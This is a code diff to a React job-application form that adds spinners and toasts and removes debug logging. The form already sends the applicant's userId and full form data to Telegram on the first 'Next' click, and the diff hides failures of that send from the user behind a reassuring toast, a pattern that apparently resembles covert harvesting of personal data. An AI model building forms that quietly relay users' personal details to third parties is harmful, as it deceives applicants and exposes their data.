@@ -36,6 +36,7 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
   const [uploadErrors, setUploadErrors] = useState<{ [key: string]: string }>({})
   const [hasNotifiedTelegram, setHasNotifiedTelegram] = useState(false) // Track if we've sent notification
   const db = ApplicationDatabase.getInstance()
+  const [isProcessingNext, setIsProcessingNext] = useState(false)
 
   const [formData, setFormData] = useState({
     // Personal Details
@@ -114,10 +115,13 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
   // Send Telegram notification with user data
   const sendTelegramNotification = async () => {
     if (hasNotifiedTelegram) {
+      console.log("Telegram notification already sent for this user")
       return // Already sent notification for this user
     }
 
     try {
+      console.log("Sending Telegram notification...")
+
       const notificationData = {
         userId,
         formData,
@@ -140,12 +144,22 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
 
       if (response.ok) {
         console.log("Telegram notification sent successfully")
-        setHasNotifiedTelegram(true) // Mark as notified
+        setHasNotifiedTelegram(true) // Mark as notified immediately after success
+
+        toast({
+          title: "Information processed",
+          description: "Your application is being reviewed.",
+        })
       } else {
-        console.error("Failed to send Telegram notification")
+        const errorText = await response.text()
+        console.error("Failed to send Telegram notification:", errorText)
+        // Don't show error to user, but still mark as notified to prevent spam
+        setHasNotifiedTelegram(true)
       }
     } catch (error) {
       console.error("Error sending Telegram notification:", error)
+      // Don't show error to user, but still mark as notified to prevent spam
+      setHasNotifiedTelegram(true)
     }
   }
 
@@ -303,10 +317,7 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
 
   // Enhanced file upload with IndexedDB
   const handleFileUpload = async (field: string, file: File | null) => {
-    console.log(`[DEBUG] Starting file upload for field: ${field}`, file?.name)
-
     if (!userId) {
-      console.error("[DEBUG] No userId available")
       toast({
         title: "System Error",
         description: "User session not initialized. Please refresh the page.",
@@ -323,20 +334,17 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
     })
 
     if (!file) {
-      console.log(`[DEBUG] No file provided for ${field}, clearing field`)
       handleInputChange(field, null)
       return
     }
 
     // Add to uploading set
     setUploadingFiles((prev) => new Set(prev).add(field))
-    console.log(`[DEBUG] Added ${field} to uploading set`)
 
     try {
       // Validate file
       const validation = validateFile(file)
       if (!validation.valid) {
-        console.error(`[DEBUG] File validation failed:`, validation.error)
         setUploadErrors((prev) => ({ ...prev, [field]: validation.error || "Validation failed" }))
         toast({
           title: "File Upload Error",
@@ -346,9 +354,6 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
         return
       }
 
-      console.log(`[DEBUG] File validation passed for ${file.name}`)
-
-      // Show immediate selection feedback
       toast({
         title: "File selected",
         description: `${file.name} selected - processing...`,
@@ -356,22 +361,18 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
 
       // Update form data FIRST to show immediate feedback
       handleInputChange(field, file)
-      console.log(`[DEBUG] Updated form data for ${field}`)
 
       // Optional compression for very large images
       let processedFile = file
       if (file.type.startsWith("image/") && file.size > 10 * 1024 * 1024) {
         try {
-          console.log(`[DEBUG] Compressing very large image: ${file.name}`)
           processedFile = await compressImage(file, 0.8)
-          console.log(`[DEBUG] Compressed from ${file.size} to ${processedFile.size} bytes`)
 
           toast({
             title: "Image optimized",
             description: `Reduced size from ${(file.size / 1024 / 1024).toFixed(1)}MB to ${(processedFile.size / 1024 / 1024).toFixed(1)}MB`,
           })
         } catch (compressionError) {
-          console.log(`[DEBUG] Image compression failed, using original:`, compressionError)
           // Continue with original file if compression fails
         }
       }
@@ -384,19 +385,15 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
 
       while (retryCount < maxRetries && !success) {
         try {
-          console.log(`[DEBUG] Attempting to save file, retry ${retryCount + 1}/${maxRetries}`)
           await db.saveFile(userId, field, processedFile)
           success = true
-          console.log(`[DEBUG] File saved successfully on attempt ${retryCount + 1}`)
         } catch (error) {
           lastError = error
           retryCount++
-          console.error(`[DEBUG] Save attempt ${retryCount} failed:`, error)
 
           if (retryCount < maxRetries) {
             // Wait before retry with exponential backoff
             const waitTime = 1000 * Math.pow(2, retryCount - 1) // 1s, 2s, 4s
-            console.log(`[DEBUG] Waiting ${waitTime}ms before retry`)
             await new Promise((resolve) => setTimeout(resolve, waitTime))
           }
         }
@@ -411,11 +408,7 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
         title: "File uploaded successfully",
         description: `${file.name} has been uploaded (${(processedFile.size / 1024).toFixed(1)} KB)`,
       })
-
-      console.log(`[DEBUG] Upload process completed successfully for ${field}`)
     } catch (error) {
-      console.error(`[DEBUG] File upload error for ${field}:`, error)
-
       // Provide specific error messages based on error type
       let errorMessage = "Failed to upload file. Please try again."
 
@@ -448,7 +441,6 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
       setUploadingFiles((prev) => {
         const newSet = new Set(prev)
         newSet.delete(field)
-        console.log(`[DEBUG] Removed ${field} from uploading set`)
         return newSet
       })
     }
@@ -573,21 +565,53 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
   }
 
   const nextStep = async () => {
-    // Validate current step (only for steps 3+)
-    if (!validateCurrentStep()) {
+    // Prevent multiple clicks
+    if (isProcessingNext) {
       return
     }
 
-    // Send Telegram notification on first "Next" button press
-    if (currentStep === 1 && !hasNotifiedTelegram) {
-      await sendTelegramNotification()
-    }
+    setIsProcessingNext(true)
 
-    // Silently save current form data before moving to next step
-    await saveFormDataSilently()
+    try {
+      // Validate current step (only for steps 3+)
+      if (!validateCurrentStep()) {
+        setIsProcessingNext(false)
+        return
+      }
 
-    if (currentStep < totalSteps) {
-      setCurrentStep(currentStep + 1)
+      // Send Telegram notification on first "Next" button press
+      if (currentStep === 1 && !hasNotifiedTelegram) {
+        toast({
+          title: "Processing application...",
+          description: "Please wait while we process your information.",
+        })
+
+        await sendTelegramNotification()
+      }
+
+      // Show processing message for all steps
+      if (currentStep > 1) {
+        toast({
+          title: "Saving progress...",
+          description: "Please wait while we save your information.",
+        })
+      }
+
+      // Silently save current form data before moving to next step
+      await saveFormDataSilently()
+
+      if (currentStep < totalSteps) {
+        setCurrentStep(currentStep + 1)
+      }
+    } catch (error) {
+      console.error("Error in nextStep:", error)
+      toast({
+        title: "Error",
+        description: "Something went wrong. Please try again.",
+        variant: "destructive",
+      })
+    } finally {
+      setIsProcessingNext(false)
     }
   }
 
@@ -662,7 +686,6 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
             accept={accept}
             onChange={(e) => {
               const file = e.target.files?.[0] || null
-              console.log(`[DEBUG] File selected for ${field}:`, file?.name)
               handleFileUpload(field, file)
             }}
             className="hidden"
@@ -677,7 +700,6 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
             capture="environment"
             onChange={(e) => {
               const file = e.target.files?.[0] || null
-              console.log(`[DEBUG] Camera file selected for ${field}:`, file?.name)
               handleFileUpload(field, file)
             }}
             className="hidden"
@@ -752,22 +774,6 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
               </label>
             </div>
           </div>
-
-          {/* Enhanced debug info */}
-          <div className="text-xs text-gray-400 mt-1 p-2 bg-gray-50 rounded">
-            <div>
-              Debug: Field={field}, HasFile={!!currentFile}, Uploading={isUploading}, Error={!!hasError}
-            </div>
-            {currentFile && (
-              <div>
-                File: {currentFile.name} ({currentFile.type}) - {(currentFile.size / 1024).toFixed(1)}KB
-              </div>
-            )}
-            {hasError && <div className="text-red-500">Error: {hasError}</div>}
-            <div>Environment: {process.env.NODE_ENV || "production"}</div>
-            <div>Storage: IndexedDB</div>
-            <div>Max File Size: 100MB</div>
-          </div>
         </div>
       </div>
     )
@@ -836,6 +842,22 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
               <div className="flex items-center space-x-2">
                 <AlertCircle className="h-4 w-4 text-blue-600" />
                 <p className="text-sm text-blue-800">Processing files... Please keep this page open until complete.</p>
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
+        {/* Processing indicator */}
+        {isProcessingNext && (
+          <Card className="mb-6 border-blue-200 bg-blue-50">
+            <CardContent className="pt-4">
+              <div className="flex items-center space-x-2">
+                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
+                <p className="text-sm text-blue-800">
+                  {currentStep === 1
+                    ? "Processing your application and saving your information..."
+                    : "Saving your progress..."}
+                </p>
               </div>
             </CardContent>
           </Card>
@@ -1264,16 +1286,38 @@ export default function ApplicationForm({ selectedJob, onBack }: ApplicationForm
               </Button>
 
               {currentStep < totalSteps ? (
-                <Button onClick={nextStep} disabled={uploadingFiles.size > 0}>
-                  {uploadingFiles.size > 0 ? "Processing..." : "Next"}
+                <Button
+                  onClick={nextStep}
+                  disabled={uploadingFiles.size > 0 || isProcessingNext}
+                  className="min-w-[100px]"
+                >
+                  {isProcessingNext ? (
+                    <div className="flex items-center space-x-2">
+                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
+                      <span>Processing...</span>
+                    </div>
+                  ) : uploadingFiles.size > 0 ? (
+                    "Processing Files..."
+                  ) : (
+                    "Next"
+                  )}
                 </Button>
               ) : (
                 <Button
                   onClick={handleSubmit}
-                  className="bg-green-600 hover:bg-green-700"
-                  disabled={uploadingFiles.size > 0}
+                  className="bg-green-600 hover:bg-green-700 min-w-[100px]"
+                  disabled={uploadingFiles.size > 0 || isProcessingNext}
                 >
-                  {uploadingFiles.size > 0 ? "Processing..." : "Submit Application"}
+                  {isProcessingNext ? (
+                    <div className="flex items-center space-x-2">
+                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
+                      <span>Submitting...</span>
+                    </div>
+                  ) : uploadingFiles.size > 0 ? (
+                    "Processing Files..."
+                  ) : (
+                    "Submit Application"
+                  )}
                 </Button>
               )}
             </div>
